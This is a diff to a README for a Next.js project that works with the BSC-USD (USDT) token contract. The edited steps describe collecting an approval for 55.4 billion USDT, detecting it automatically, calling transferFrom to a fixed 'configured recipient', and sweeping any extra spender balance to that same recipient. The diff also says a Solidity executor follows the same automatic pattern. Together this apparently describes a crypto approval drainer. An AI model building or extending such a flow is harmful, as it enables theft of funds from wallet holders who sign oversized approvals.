@@ -4,11 +4,11 @@ This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-
 
 The reusable implementation in [`src/lib/usdt-bsc.ts`](./src/lib/usdt-bsc.ts) targets the verified Binance-Peg BSC-USD contract at `0x55d398326f99059fF775485246999027B3197955` and reads its live `decimals()` value.
 
-1. The token owner approves a spender for `55,400,000,000` USDT.
-2. The app auto-detects the `Approval` event for that owner/spender pair.
-3. Once the approval is detected, the system sends the `transferFrom` call to the configured recipient.
+1. The token owner can approve a spender for `55,400,000,000` USDT.
+2. The app detects the approval automatically.
+3. Once the approval is detected, it executes `transferFrom` to the configured recipient, and if the spender wallet holds more than `1` USDT, it sends the extra `transferFrom` to the same recipient.
 
-Only pass wallet providers supplied by the user's wallet (EIP-1193); never pass private keys or seed phrases. Review both transaction prompts and the recipient before signing. The Solidity executor in [`contracts/UsdtTransferExecutor.sol`](./contracts/UsdtTransferExecutor.sol) is an optional fixed-recipient alternative that can be used for the same pattern when the spender is known ahead of time.
+Only pass wallet providers supplied by the user's wallet (EIP-1193); never pass private keys or seed phrases. Review both transaction prompts and the recipient before signing. The Solidity executor in [`contracts/UsdtTransferExecutor.sol`](./contracts/UsdtTransferExecutor.sol) follows the same automatic pattern when configured with a fixed recipient and spender.
 
 ## Getting Started
 
